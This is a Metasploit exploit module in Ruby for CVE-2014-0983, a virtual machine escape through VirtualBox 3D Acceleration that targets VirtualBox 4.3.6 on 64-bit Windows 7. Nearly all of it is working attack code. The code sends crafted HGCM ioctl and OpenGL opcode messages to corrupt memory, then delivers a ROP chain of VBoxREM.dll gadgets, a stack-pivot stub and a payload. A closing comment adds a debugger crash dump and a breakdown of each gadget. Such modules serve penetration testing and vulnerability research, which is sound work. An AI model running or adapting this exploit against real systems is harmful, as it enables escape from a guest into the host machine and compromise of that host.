##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require \'msf/core\'
require \'rex\'

class Metasploit3 < Msf::Exploit::Local
  Rank = AverageRanking

  DEVICE               = \'\\\\\\\\.\\\\VBoxGuest\'
  INVALID_HANDLE_VALUE = 0xFFFFFFFF

  # VBOX HGCM protocol constants
  VBOXGUEST_IOCTL_HGCM_CONNECT    = 2269248
  VBOXGUEST_IOCTL_HGCM_DISCONNECT = 2269252
  VBOXGUEST_IOCTL_HGCM_CALL       = 2269256
  CONNECT_MSG_SIZE                = 140
  DISCONNECT_MSG_SIZE             = 8
  SET_VERSION_MSG_SIZE            = 40
  SET_PID_MSG_SIZE                = 28
  CALL_EA_MSG_SIZE                = 40
  VERR_WRONG_ORDER                = 0xffffffea
  SHCRGL_GUEST_FN_SET_PID         = 12
  SHCRGL_CPARMS_SET_PID           = 1
  SHCRGL_GUEST_FN_SET_VERSION     = 6
  SHCRGL_CPARMS_SET_VERSION       = 2
  SHCRGL_GUEST_FN_INJECT          = 9
  SHCRGL_CPARMS_INJECT            = 2
  CR_PROTOCOL_VERSION_MAJOR       = 9
  CR_PROTOCOL_VERSION_MINOR       = 1
  VMM_DEV_HGCM_PARM_TYPE_32_BIT   = 1
  VMM_DEV_HGCM_PARM_TYPE_64_BIT   = 2
  VMM_DEV_HGCM_PARM_TYPE_LIN_ADDR = 5

  def initialize(info={})
    super(update_info(info, {
      \'Name\'           => \'VirtualBox 3D Acceleration Virtual Machine Escape\',
      \'Description\'    => %q{
        This module exploits a vulnerability in the 3D Acceleration support for VirtualBox. The
        vulnerability exists in the remote rendering of OpenGL-based 3D graphics. By sending a
        sequence of specially crafted of rendering messages, a virtual machine can exploit an out
        of bounds array access to corrupt memory and escape to the host. This module has been
        tested successfully on Windows 7 SP1 (64 bits) as Host running  Virtual Box 4.3.6.
      },
      \'License\'        => MSF_LICENSE,
      \'Author\'         =>
        [
          \'Francisco Falcon\', # Vulnerability Discovery and PoC
          \'Florian Ledoux\', # Win 8 64 bits exploitation analysis
          \'juan vazquez\' # MSF module
        ],
      \'Arch\'           => ARCH_X86_64,
      \'Platform\'       => \'win\',
      \'SessionTypes\'   => [\'meterpreter\'],
      \'DefaultOptions\' =>
        {
          \'EXITFUNC\' => \'thread\'
        },
      \'Targets\'        =>
        [
          [ \'VirtualBox 4.3.6 / Windows 7 SP1 / 64 bits (ASLR/DEP bypass)\',
            {
              :messages => :target_virtualbox_436_win7_64
            }
          ]
        ],
      \'Payload\'        =>
        {
          \'Space\'       => 7000,
          \'DisableNops\' => true
        },
      \'References\'     =>
        [
          [\'CVE\', \'2014-0983\'],
          [\'BID\', \'66133\'],
          [\'URL\', \'http://www.coresecurity.com/advisories/oracle-virtualbox-3d-acceleration-multiple-memory-corruption-vulnerabilities\'],
          [\'URL\', \'http://corelabs.coresecurity.com/index.php?module=Wiki&action=view&type=publication&name=oracle_virtualbox_3d_acceleration\'],
          [\'URL\', \'http://www.vupen.com/blog/20140725.Advanced_Exploitation_VirtualBox_VM_Escape.php\']
        ],
      \'DisclosureDate\' => \'Mar 11 2014\',
      \'DefaultTarget\'  => 0
    }))

  end

  def open_device
    r = session.railgun.kernel32.CreateFileA(DEVICE, \"GENERIC_READ | GENERIC_WRITE\", 0, nil, \"OPEN_EXISTING\", \"FILE_ATTRIBUTE_NORMAL\", 0)

    handle = r[\'return\']

    if handle == INVALID_HANDLE_VALUE
      return nil
    end

    return handle
  end

  def send_ioctl(ioctl, msg)
    result = session.railgun.kernel32.DeviceIoControl(@handle, ioctl, msg, msg.length, msg.length, msg.length, 4, \"\")

    if result[\"GetLastError\"] != 0
      unless result[\"ErrorMessage\"].blank?
        vprint_error(\"#{result[\"ErrorMessage\"]}\")
      end
      return nil
    end

    unless result[\"lpBytesReturned\"] && result[\"lpBytesReturned\"] == msg.length
      unless result[\"ErrorMessage\"].blank?
        vprint_error(\"#{result[\"ErrorMessage\"]}\")
      end
      return nil
    end

    unless result[\"lpOutBuffer\"] && result[\"lpOutBuffer\"].unpack(\"V\").first == 0
      unless result[\"ErrorMessage\"].blank?
        vprint_error(\"#{result[\"ErrorMessage\"]}\")
      end
      return nil
    end

    result
  end

  def connect
    msg = \"\\x00\" * CONNECT_MSG_SIZE

    msg[4, 4] = [2].pack(\"V\")
    msg[8, \"VBoxSharedCrOpenGL\".length] = \"VBoxSharedCrOpenGL\"

    result = send_ioctl(VBOXGUEST_IOCTL_HGCM_CONNECT, msg)

    if result.nil?
      return result
    end

    client_id = result[\"lpOutBuffer\"][136, 4].unpack(\"V\").first

    client_id
  end

  def disconnect
    msg = \"\\x00\" * DISCONNECT_MSG_SIZE

    msg[4, 4] = [@client_id].pack(\"V\")

    result = send_ioctl(VBOXGUEST_IOCTL_HGCM_DISCONNECT, msg)

    result
  end

  def set_pid(pid)
    msg = \"\\x00\" * SET_PID_MSG_SIZE

    msg[0, 4]  = [VERR_WRONG_ORDER].pack(\"V\")
    msg[4, 4]  = [@client_id].pack(\"V\")  # u32ClientID
    msg[8, 4]  = [SHCRGL_GUEST_FN_SET_PID].pack(\"V\")
    msg[12, 4] = [SHCRGL_CPARMS_SET_PID].pack(\"V\")
    msg[16, 4] = [VMM_DEV_HGCM_PARM_TYPE_64_BIT].pack(\"V\")
    msg[20, 4] = [pid].pack(\"V\")

    result = send_ioctl(VBOXGUEST_IOCTL_HGCM_CALL, msg)

    result
  end

  def set_version
    msg = \"\\x00\" * SET_VERSION_MSG_SIZE

    msg[0, 4]  = [VERR_WRONG_ORDER].pack(\"V\")
    msg[4, 4]  = [@client_id].pack(\"V\") # u32ClientID
    msg[8, 4]  = [SHCRGL_GUEST_FN_SET_VERSION].pack(\"V\")
    msg[12, 4] = [SHCRGL_CPARMS_SET_VERSION].pack(\"V\")
    msg[16, 4] = [VMM_DEV_HGCM_PARM_TYPE_32_BIT].pack(\"V\")
    msg[20, 4] = [CR_PROTOCOL_VERSION_MAJOR].pack(\"V\")
    msg[28, 4] = [VMM_DEV_HGCM_PARM_TYPE_32_BIT].pack(\"V\")
    msg[32, 4] = [CR_PROTOCOL_VERSION_MINOR].pack(\"V\")

    result = send_ioctl(VBOXGUEST_IOCTL_HGCM_CALL, msg)

    result
  end

  def trigger(buff_addr, buff_length)
    msg = \"\\x00\" * CALL_EA_MSG_SIZE

    msg[4, 4] = [@client_id].pack(\"V\")  # u32ClientID
    msg[8, 4] = [SHCRGL_GUEST_FN_INJECT].pack(\"V\")
    msg[12, 4] = [SHCRGL_CPARMS_INJECT].pack(\"V\")
    msg[16, 4] = [VMM_DEV_HGCM_PARM_TYPE_32_BIT].pack(\"V\")
    msg[20, 4] = [@client_id].pack(\"V\") # u32ClientID
    msg[28, 4] = [VMM_DEV_HGCM_PARM_TYPE_LIN_ADDR].pack(\"V\")
    msg[32, 4] = [buff_length].pack(\"V\") # size_of(buf)
    msg[36, 4] = [buff_addr].pack(\"V\") # (buf)

    result = send_ioctl(VBOXGUEST_IOCTL_HGCM_CALL, msg)

    result
  end

  def stack_adjustment
    pivot = \"\\x65\\x8b\\x04\\x25\\x10\\x00\\x00\\x00\"  # \"mov eax,dword ptr gs:[10h]\" # Get Stack Bottom from TEB
    pivot << \"\\x89\\xc4\"                         # mov esp, eax                 # Store stack bottom in esp
    pivot << \"\\x81\\xC4\\x30\\xF8\\xFF\\xFF\"         # add esp, -2000               # Plus a little offset...

    pivot
  end

  def target_virtualbox_436_win7_64(message_id)
    opcodes = [0xFF, 0xea, 0x02, 0xf7]

    opcodes_hdr = [
      0x77474c01,    # type CR_MESSAGE_OPCODES
      0x8899,        # conn_id
      opcodes.length # numOpcodes
    ]

    if message_id == 2
      # Message used to achieve Code execution
      # See at the end of the module for a better description of the ROP Chain,
      # or even better, read: http://www.vupen.com/blog/20140725.Advanced_Exploitation_VirtualBox_VM_Escape.php
      # All gadgets from VBoxREM.dll
      opcodes_data = [0x8, 0x30, 0x331].pack(\"V*\")

      opcodes_data << [0x6a68599a].pack(\"Q<\") # Gadget 2 # pop rdx # xor ecx,dword ptr [rax] # add cl,cl # movzx eax,al # ret
      opcodes_data << [112].pack(\"Q<\") # RDX
      opcodes_data << [0x6a70a560].pack(\"Q<\") # Gadget 3 # lea rax,[rsp+8] # ret
      opcodes_data << [0x6a692b1c].pack(\"Q<\") # Gadget 4 # lea rax,[rdx+rax] # ret
      opcodes_data << [0x6a6931d6].pack(\"Q<\") # Gadget 5 # add dword ptr [rax],eax # add cl,cl # ret
      opcodes_data << [0x6a68124e].pack(\"Q<\") # Gadget 6 # pop r12 # ret
      opcodes_data << [0x6A70E822].pack(\"Q<\") # R12 := ptr to .data in VBoxREM.dll (4th argument lpflOldProtect)
      opcodes_data << [0x6a70927d].pack(\"Q<\") # Gadget 8 # mov r9,r12 # mov r8d,dword ptr [rsp+8Ch] # mov rdx,qword ptr [rsp+68h] # mov rdx,qword ptr [rsp+68h] # call rbp
      opcodes_data << Rex::Text.pattern_create(80)
      opcodes_data << [0].pack(\"Q<\")          # 1st arg (lpAddress) # chain will store stack address here
      opcodes_data << Rex::Text.pattern_create(104 - 80 - 8)
      opcodes_data << [0x2000].pack(\"Q<\")     # 2nd arg (dwSize)
      opcodes_data << Rex::Text.pattern_create(140 - 104 - 8)
      opcodes_data << [0x40].pack(\"V\")        # 3rd arg (flNewProtect)
      opcodes_data << Rex::Text.pattern_create(252 - 4 - 140 - 64)
      opcodes_data << [0x6A70BB20].pack(\"V\")  # ptr to jmp VirtualProtect instr.
      opcodes_data << \"A\" * 8
      opcodes_data << [0x6a70a560].pack(\"Q<\") # Gadget 9
      opcodes_data << [0x6a6c9d3d].pack(\"Q<\") # Gadget 10
      opcodes_data << \"\\xe9\\x5b\\x02\\x00\\x00\"  # jmp $+608
      opcodes_data << \"A\" * (624 - 24 - 5)
      opcodes_data << [0x6a682a2a].pack(\"Q<\") # Gadget 1 # xchg eax, esp # ret # stack pivot
      opcodes_data << stack_adjustment
      opcodes_data << payload.encoded
      opcodes_data << Rex::Text.pattern_create(8196 - opcodes_data.length)
    else
      # Message used to corrupt head_spu
      # 0x2a9 => offset to head_spu in VBoxSharedCrOpenGL.dll .data
      # 8196 => On my tests, this data size allows to keep the memory
      # not reused until the second packet arrives. The second packet,
      # of course, must have 8196 bytes length too. So this memory is
      # reused and code execution can be accomplished.
      opcodes_data = [0x8, 0x30, 0x331, 0x2a9].pack(\"V*\")
      opcodes_data << \"B\" * (8196 - opcodes_data.length)
    end

    msg = opcodes_hdr.pack(\"V*\") + opcodes.pack(\"C*\") + opcodes_data

    msg
  end

  def send_opcodes_msg(process, message_id)
    msg = self.send(target[:messages], message_id)

    mem = process.memory.allocate(msg.length + (msg.length % 1024))

    process.memory.write(mem, msg)

    trigger(mem, msg.length)
  end

  def check
    handle = open_device
    if handle.nil?
      return Exploit::CheckCode::Safe
    end
    session.railgun.kernel32.CloseHandle(handle)

    Exploit::CheckCode::Detected
  end

  def exploit
    unless self.respond_to?(target[:messages])
      print_error(\"Invalid target specified: no messages callback function defined\")
      return
    end

    print_status(\"Opening device...\")
    @handle = open_device
    if @handle.nil?
      fail_with(Failure::NoTarget, \"#{DEVICE} device not found\")
    else
      print_good(\"#{DEVICE} found, exploiting...\")
    end

    print_status(\"Connecting to the service...\")
    @client_id = connect
    if @client_id.nil?
      fail_with(Failure::Unknown, \"Connect operation failed\")
    end

    print_good(\"Client ID #{@client_id}\")

    print_status(\"Calling SET_VERSION...\")
    result = set_version
    if result.nil?
      fail_with(Failure::Unknown, \"Failed to SET_VERSION\")
    end

    this_pid = session.sys.process.getpid
    print_status(\"Calling SET_PID...\")
    result = set_pid(this_pid)
    if result.nil?
      fail_with(Failure::Unknown, \"Failed to SET_PID\")
    end

    this_proc = session.sys.process.open
    print_status(\"Sending First 0xEA Opcode Message to control head_spu...\")
    result = send_opcodes_msg(this_proc, 1)
    if result.nil?
      fail_with(Failure::Unknown, \"Failed to control heap_spu...\")
    end

    print_status(\"Sending Second 0xEA Opcode Message to execute payload...\")
    @old_timeout = session.response_timeout
    session.response_timeout = 5
    begin
      send_opcodes_msg(this_proc, 2)
    rescue Rex::TimeoutError
      vprint_status(\"Expected timeout in case of successful exploitation\")
    end
  end

  def cleanup
    unless @old_timeout.nil?
      session.response_timeout = @old_timeout
    end

    if session_created?
      # Unless we add CoE there is nothing to do
      return
    end

    unless @client_id.nil?
      print_status(\"Disconnecting from the service...\")
      disconnect
    end

    unless @handle.nil?
      print_status(\"Closing the device...\")
      session.railgun.kernel32.CloseHandle(@handle)
    end
  end

end

=begin

* VirtualBox 4.3.6 / Windows 7 SP1 64 bits

Crash after second message:

0:013> dd rax
00000000`0e99bd44  41306141 61413161 33614132 41346141
00000000`0e99bd54  61413561 37614136 41386141 62413961
00000000`0e99bd64  31624130 41326241 62413362 35624134
00000000`0e99bd74  41366241 62413762 39624138 41306341
00000000`0e99bd84  63413163 33634132 41346341 63413563
00000000`0e99bd94  37634136 41386341 64413963 31644130
00000000`0e99bda4  41326441 64413364 35644134 41366441
00000000`0e99bdb4  64413764 39644138 41306541 65413165
0:013> r
rax=000000000e99bd44 rbx=0000000000000001 rcx=000007fef131e8ba
rdx=000000006a72fb62 rsi=000000000e5531f0 rdi=0000000000000000
rip=000007fef12797f8 rsp=0000000004b5f620 rbp=0000000041424344 << already controlled...
 r8=0000000000000001  r9=00000000000005c0 r10=0000000000000000
r11=0000000000000246 r12=0000000000000000 r13=00000000ffffffff
r14=000007fef1f90000 r15=0000000002f6e280
iopl=0         nv up ei pl nz na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
VBoxSharedCrOpenGL!crServerAddNewClient+0x208:
000007fe`f12797f8 ff9070030000    call    qword ptr [rax+370h] ds:00000000`0e99c0b4=7641397541387541

Gadget 1: Stack Pivot # 0x6a682a2a

 xchg    eax,esp    94
 ret                c3

Gadget 2: Control RDX value # 0x6a68599a

 pop rdx                    5a
 xor ecx,dword ptr [rax]    33 08
 add cl,cl                  00 c9
 movzx eax,al               0f b6 c0
 ret                        c3

Gadget 3: Store ptr to RSP in RAX # 0x6a70a560

 lea rax,[rsp+8]            48 8d 44 24 08
 ret                        c3

Gadget 4: Store ptr to RSP + RDX offset (controlled) in RAX # 0x6a692b1c

 lea rax,[rdx+rax]          48 8d 04 02
 ret                        c3

Gadget 5: Write Stack Address (EAX) to the stack # 0x6a6931d6

 add dword ptr [rax],eax    01 00
 add cl,cl                  00 c9
 ret                        c3

Gadget 6: Control R12 # 0x6a68124e

pop r12
ret

Gadget 7: Recover VirtualProtect arguments from the stack and call it (ebp) # 0x6a70927d

 mov r9,r12                   4d 89 e1
 mov r8d,dword ptr [rsp+8Ch]  44 8b 84 24 8c 00 00 00
 mov rdx,qword ptr [rsp+68h]  48 8b 54 24 68
 mov rcx,qword ptr [rsp+50h]  48 8b 4c 24 50
 call rbp                     ff d5

Gadget 8: After VirtualProtect, get pointer to the shellcode in the # 0x6a70a560

 lea rax, [rsp+8]   48 8d 44 24 08
 ret                c3

 Gadget 9: Push the pointer and provide control to shellcode # 0x6a6c9d3d

 push rax   50
 adc cl,ch  10 e9
 ret        c3

=end